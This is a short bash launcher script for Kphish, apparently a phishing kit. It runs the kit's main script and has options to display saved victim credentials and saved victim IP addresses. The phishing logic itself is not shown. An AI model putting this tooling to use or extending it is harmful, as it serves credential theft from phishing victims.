#!/bin/bash

# https://github.com/DetaSploit/Kphish

if [[ $(uname -o) == *'Android'* ]];then
	KPHISH_ROOT="/data/data/com.termux/files/usr/opt/kphish"
else
	export KPHISH_ROOT="/opt/kphish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Kphish type \`kphish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $KPHISH_ROOT/auth/usernames.dat 2> /dev/null || {
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $KPHISH_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $KPHISH_ROOT
	bash ./kphish.sh
fi
